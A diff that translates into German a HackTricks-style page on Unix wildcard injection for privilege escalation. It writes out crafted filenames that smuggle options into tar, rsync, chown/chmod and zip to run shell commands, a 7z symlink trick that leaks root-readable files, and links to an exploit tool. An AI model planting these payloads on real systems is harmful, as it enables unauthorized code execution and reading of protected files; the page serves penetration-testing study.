@@ -2,71 +2,59 @@
 
 ## chown, chmod
 
-You can **indicate which file owner and permissions you want to copy for the rest of the files**
-
+Sie können **angeben, welchen Dateibesitzer und welche Berechtigungen Sie für die restlichen Dateien kopieren möchten**
 ```bash
 touch "--reference=/my/own/path/filename"
 ```
-
-You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(combined attack)_\
-More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+Sie können dies mit [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(kombinierter Angriff)_ ausnutzen.\
+Weitere Informationen finden Sie unter [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
 
 ## Tar
 
-**Execute arbitrary commands:**
-
+**Führen Sie beliebige Befehle aus:**
 ```bash
 touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 ```
-
-You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_\
-More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+Sie können dies ausnutzen, indem Sie [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar-Angriff)_\
+Weitere Informationen finden Sie unter [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
 
 ## Rsync
 
-**Execute arbitrary commands:**
-
+**Führen Sie beliebige Befehle aus:**
 ```bash
 Interesting rsync option from manual:
 
- -e, --rsh=COMMAND           specify the remote shell to use
-     --rsync-path=PROGRAM    specify the rsync to run on remote machine
+-e, --rsh=COMMAND           specify the remote shell to use
+--rsync-path=PROGRAM    specify the rsync to run on remote machine
 ```
 
 ```bash
 touch "-e sh shell.sh"
 ```
-
-You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_attack)_\
-More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+Sie können dies ausnutzen, indem Sie [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_attack)_\
+Weitere Informationen finden Sie unter [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
 
 ## 7z
 
-In **7z** even using `--` before `*` (note that `--` means that the following input cannot treated as parameters, so just file paths in this case) you can cause an arbitrary error to read a file, so if a command like the following one is being executed by root:
-
+In **7z** können Sie selbst mit `--` vor `*` (beachten Sie, dass `--` bedeutet, dass die folgenden Eingaben nicht als Parameter behandelt werden können, sondern in diesem Fall nur als Dateipfade) einen beliebigen Fehler verursachen, um eine Datei zu lesen. Wenn also ein Befehl wie der folgende von root ausgeführt wird:
 ```bash
 7za a /backup/$filename.zip -t7z -snl -p$pass -- *
 ```
-
-And you can create files in the folder were this is being executed, you could create the file `@root.txt` and the file `root.txt` being a **symlink** to the file you want to read:
-
+Und Sie können Dateien im Ordner erstellen, in dem dies ausgeführt wird. Sie könnten die Datei `@root.txt` und die Datei `root.txt` erstellen, die ein **symlink** zu der Datei ist, die Sie lesen möchten:
 ```bash
 cd /path/to/7z/acting/folder
 touch @root.txt
 ln -s /file/you/want/to/read root.txt
 ```
+Dann wird **7z** beim Ausführen `root.txt` als eine Datei behandeln, die die Liste der Dateien enthält, die es komprimieren soll (das zeigt die Existenz von `@root.txt` an), und wenn 7z `root.txt` liest, wird es `/file/you/want/to/read` lesen und **da der Inhalt dieser Datei keine Liste von Dateien ist, wird es einen Fehler ausgeben**, der den Inhalt zeigt.
 
-Then, when **7z** is execute, it will treat `root.txt` as a file containing the list of files it should compress (thats what the existence of `@root.txt` indicates) and when it 7z read `root.txt` it will read `/file/you/want/to/read` and **as the content of this file isn't a list of files, it will throw and error** showing the content.
-
-_More info in Write-ups of the box CTF from HackTheBox._
+_Mehr Infos in den Write-ups der Box CTF von HackTheBox._
 
 ## Zip
 
-**Execute arbitrary commands:**
-
+**Führe beliebige Befehle aus:**
 ```bash
 zip name.zip files -T --unzip-command "sh -c whoami"
 ```
-
 {{#include ../../banners/hacktricks-training.md}}
